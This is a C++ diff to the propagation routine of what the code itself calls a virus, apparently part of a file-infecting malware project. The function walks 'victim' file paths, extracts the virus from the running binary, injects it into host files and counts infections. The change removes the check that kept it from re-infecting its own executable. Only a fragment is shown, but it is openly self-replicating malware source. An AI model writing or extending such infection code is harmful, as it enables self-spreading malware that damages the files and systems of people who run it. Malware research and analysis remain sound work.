@@ -16,10 +16,9 @@ namespace vt::propagation {
 // @Tparam DirIteratorT A directory iterator that provides victim file paths.
 // @Tparam Injector     A code injector.
 // @Tparam Redirector   A redirector.
-// @param  cur_exec_name The current invoking executable name.
 // @returns number of success infection.
 template <typename DirIteratorT, typename Injector, typename Redirector>
-size_t propagate(const char* cur_exec_name) {
+size_t propagate() {
   size_t num_infections = 0;
 
   // Extract the virus from the current binary.
@@ -36,9 +35,7 @@ size_t propagate(const char* cur_exec_name) {
       }
 
       auto host_size = host.file_size();
-      if (host_size == 0 ||
-          !vt::strcmp(host_path, cur_exec_name + vt::strlen(cur_exec_name) -
-                                     vt::strlen(host_path))) {
+      if (host_size == 0) {
         continue;
       }
 
